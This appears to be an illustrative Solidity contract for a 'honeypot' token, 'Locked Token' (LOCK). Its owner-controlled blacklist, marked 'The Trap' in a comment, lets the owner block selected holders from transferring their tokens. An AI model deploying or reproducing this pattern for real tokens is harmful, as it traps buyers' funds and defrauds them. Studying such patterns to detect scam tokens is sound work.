// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract LockHoneypot {
    string public name = "Locked Token";
    string public symbol = "LOCK";
    uint256 public totalSupply = 1000000e18;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public isBlacklisted;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    function blacklistAddress(address account, bool value) public onlyOwner {
        isBlacklisted[account] = value;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        // The Trap: Prevents the transaction if the sender is blacklisted
        require(!isBlacklisted[msg.sender], "Address is blacklisted");

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        return true;
    }
}